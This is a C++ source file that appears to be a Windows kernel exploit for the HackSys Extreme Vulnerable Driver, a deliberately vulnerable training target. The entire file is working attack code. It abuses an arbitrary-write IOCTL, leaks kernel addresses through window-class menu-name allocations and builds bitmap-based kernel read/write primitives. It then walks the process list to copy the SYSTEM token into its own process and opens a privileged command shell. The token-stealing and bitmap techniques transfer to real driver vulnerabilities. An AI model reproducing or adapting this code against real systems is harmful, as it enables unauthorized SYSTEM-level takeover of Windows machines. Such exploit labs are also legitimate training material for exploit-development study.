#include<Windows.h>
#include<stdio.h>
#include<iostream>
#include<iomanip>

#include "KrnlPwnLib.h"
#include "Krnltypes.h"

extern "C" int _stdcall Int_3();

HANDLE hDevice = NULL;

HBMP managerBMP = {};
HBMP workerBmp = {};
DWORD64 UserKernelDesktopHeap = 0;
DWORD64 kernelDesktopHeap = 0;
DWORD64 ulClientDelta = 0;

#define HACKSYS_EVD_IOCTL_ARBITRARY_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0X802, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

void write_what_where_dword(UINT64 whereWriteAddress,UINT32 writeWhatValue) {
	WRITE_WHAT_WHERE exploitStruct = {};
	PULONG_PTR whatPtr = (PULONG_PTR)&writeWhatValue;
	DWORD lpBytesReturned = 0;

	exploitStruct.Where = (PULONG_PTR)whereWriteAddress;
	exploitStruct.What = (PULONG_PTR)whatPtr;

	std::cout << "[+] write at: " << std::hex << whereWriteAddress << std::endl;
	std::cout << "[+] write with: " << std::hex << writeWhatValue << std::endl;

	DWORD dwIoControlCode = 0x0022200B;

	BOOL sentIOCTL = DeviceIoControl(hDevice, dwIoControlCode, &exploitStruct, 0x10, NULL, 0, &lpBytesReturned, NULL);
	if (sentIOCTL == NULL) {
		printf("\n\n Error Sennding IOCTL : %d\r\n Exiting......", GetLastError());
		exit(-1);
	}
}

void write_what_where_qword(UINT64 whereWriteAddress,UINT64 writeWhatValue) {
	UINT32 lowvalue = writeWhatValue;
	write_what_where_dword(whereWriteAddress, lowvalue);

	UINT32 highvalue = writeWhatValue >> 0x20;				// How to select High Value from QWORD
	write_what_where_dword(whereWriteAddress + 0x4, highvalue);
}

void find_ulClientDelta() {
	DWORD64 teb_Base = (DWORD64)NtCurrentTeb();

	UserKernelDesktopHeap = *(PDWORD64)(teb_Base + 0x828);
	kernelDesktopHeap = *(PDWORD64)(UserKernelDesktopHeap + 0x28);

	ulClientDelta = kernelDesktopHeap - UserKernelDesktopHeap;
}

DWORD64 leakWnd(HWND hwnd) {

	PDWORD64 buffer = (PDWORD64)UserKernelDesktopHeap;
	DWORD i = 0;

	while (1) {
		if (buffer[i] == (DWORD64)hwnd) {
			return (DWORD64)(buffer + i);
		}
		i++;
	}
}

DWORD64 lpszMenuName(HWND hwnd) {

	find_ulClientDelta();

	DWORD64 bitMapAddr = leakWnd(hwnd);   

	DWORD64 kernelTagCLS = *(PDWORD64)(bitMapAddr + 0xa8);

	DWORD64 lpszMenuNameAddr = *(PDWORD64)(kernelTagCLS - ulClientDelta + 0x90);

	return lpszMenuNameAddr;
}

HBMP leak() {
	HBMP hbmp;
	DWORD64 curr = 0;
	DWORD64 prev = 1;
	for (int i = 0; i < 700; i++) {
		char buf[0x8F0];
		memset(buf, 0x41, 0x8f0);

		WNDCLASSEX wnd = { 0x0 };
		wnd.cbSize = sizeof(wnd);
		wnd.lpszClassName = TEXT("case");
		wnd.lpszMenuName = buf;
		wnd.lpfnWndProc = DefWindowProc;
		int result = RegisterClassEx(&wnd);
		if (!result) {
			printf("[-] RegisterClassEx Error leak Case : %d\r\n ", GetLastError());
		}

		HWND test = CreateWindowEx(
			0,
			wnd.lpszClassName,
			TEXT("WORDS"),
			0,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			NULL, NULL, NULL, NULL);

		curr = lpszMenuName(test);

		if (curr == prev) {
			DestroyWindow(test);
			UnregisterClass(wnd.lpszClassName,NULL);

			WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
			RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
			RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');

			hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
			hbmp.kAddr = curr;
			hbmp.pvScan0 = (PUCHAR)(curr + 0x50);	

			return hbmp;
		}

		DestroyWindow(test);
		UnregisterClass(wnd.lpszClassName, NULL);
		prev = curr;
	}
	printf("[-] No Leak Exiting");
	exit(-1);
}

void pool_fengshui() {
	WNDCLASSEX wnd = { 0x0 };
	wnd.cbSize = sizeof(wnd);
	wnd.lpszClassName = TEXT("MainWClass");
	wnd.lpszMenuName = TEXT("AAAA");
	wnd.lpfnWndProc = DefWindowProc;

	int result = RegisterClassEx(&wnd);
	if (!result) {
		printf("[-] RegisterClassEx Error : %d\r\n", GetLastError());
	}

	HWND testWnd = CreateWindowEx(
		0,
		wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);

	managerBMP = leak();
	workerBmp = leak();
	std::cout << "[+] managerBmp address leak pvScan0 at: " << std::setiosflags(std::ios::uppercase) << std::hex << (DWORD64)managerBMP.pvScan0 << std::endl;
	std::cout << "[+] workerBmp address leak pvScan0 at: " << std::setiosflags(std::ios::uppercase) << std::hex << (DWORD64)workerBmp.pvScan0 << std::endl;


	write_what_where_qword((DWORD64)managerBMP.pvScan0,(DWORD64)workerBmp.pvScan0);
}

void readOOB(DWORD64 whereRead, LPVOID whatValue, int len) {
	SetBitmapBits(managerBMP.hBmp, len, &whereRead);
	GetBitmapBits(workerBmp.hBmp, len, whatValue);
}

void writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len) {
	SetBitmapBits(managerBMP.hBmp, len, &whereWrite);
	GetBitmapBits(workerBmp.hBmp, len, &whatValue);
}


VOID stealToken() {
	WNDCLASSEX leak_Class = { 0x0 };
	leak_Class.lpfnWndProc = DefWindowProc;
	leak_Class.cbSize = sizeof(WNDCLASSEX);
	leak_Class.lpszClassName = TEXT("leakWND");
	leak_Class.lpszMenuName = TEXT("leakWND");

	int result = RegisterClassEx(&leak_Class);
	if (!result)
	{
		printf("[-] (EXITING) RegisterClassEx Failed : leak_Class : %d\r\n", GetLastError());
		exit(-1);
	}

	HWND leak_HWND = CreateWindowEx(
		0,
		leak_Class.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);

	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(leak_HWND, 1);
	std::cout << "[+] tagWND address is: " << (DWORD64)tagWND << std::endl;
	
	DWORD64 _KTHREAD_kobj;
	readOOB((DWORD64)tagWND->h.pti, (BYTE*)&_KTHREAD_kobj, sizeof(DWORD64));
	std::cout << "[+] _KTHREAD address is: " << (DWORD64)_KTHREAD_kobj << std::endl;
	
	DWORD64 _KAPC_uobj = (DWORD64)_KTHREAD_kobj + 0x98;
	DWORD64 _KAPC_kobj = 0;
	readOOB((UINT64)_KAPC_uobj, (BYTE*)&_KAPC_kobj, sizeof(DWORD64));
	std::cout << "[+] _KAPC_STAT address is: " << (DWORD64)_KAPC_kobj << std::endl;

	DWORD64 _EPROCESS_uobj = (DWORD64)_KAPC_kobj + 0x20;
	DWORD64 _EPROCESS_kobj = 0;
	readOOB((UINT64)_EPROCESS_uobj, (BYTE*)&_EPROCESS_kobj, sizeof(DWORD64));
	std::cout << "[+] Current _EPROCESS address is: " << (DWORD64)_EPROCESS_kobj << std::endl;

	DWORD64 _Current_Token = 0;
	DWORD64 _Current_Token_Address = _EPROCESS_kobj + 0x358;
	readOOB((UINT64)_Current_Token_Address, (BYTE*)&_Current_Token, sizeof(DWORD64));
	std::cout << "[+] Current Process Token is: " << _Current_Token << std::endl;
	std::cout << "[+] Current Process Token at: " << _Current_Token_Address << std::endl;

	DWORD dwUniqueProcessIdOffset = 0x2e0;
	DWORD dwTokenOffset = 0x358;
	DWORD dwActiveProcessLinks = 0x2e8;
	DWORD64 lpPreEPROCESS = NULL;
	DWORD64 lpCurrentProcID = NULL;
	LIST_ENTRY lePreProcessLink;
	DWORD64 lpSystemToken = NULL;
	DWORD dwCurrentPID;

	readOOB(_EPROCESS_kobj + dwUniqueProcessIdOffset, (BYTE*)&lpCurrentProcID, sizeof(DWORD64));
	readOOB(_EPROCESS_kobj + dwActiveProcessLinks, (BYTE*)&lePreProcessLink, sizeof(LIST_ENTRY));

	do {
		lpPreEPROCESS = (DWORD64)lePreProcessLink.Blink - dwActiveProcessLinks;
		
		readOOB(lpPreEPROCESS + dwUniqueProcessIdOffset, (BYTE*)&lpCurrentProcID, sizeof(DWORD64));
		readOOB(lpPreEPROCESS + dwTokenOffset, (BYTE*)&lpSystemToken, sizeof(DWORD64));

		readOOB(lpPreEPROCESS + dwActiveProcessLinks, (BYTE*)&lePreProcessLink, sizeof(LIST_ENTRY));

		dwCurrentPID = LOWORD(lpCurrentProcID);

	} while (dwCurrentPID != 0x4);

	write_what_where_qword(_Current_Token_Address,(DWORD64)lpSystemToken);

}

void popCMDtoConfirm() {
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
}

int main()
{
	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		printf("[-] Failed to find HMValidateHandle");
		return -1;
	}

	hDevice = open_device();

	pool_fengshui();

	stealToken();

	popCMDtoConfirm();

	system("pause");
	
	return 0;
}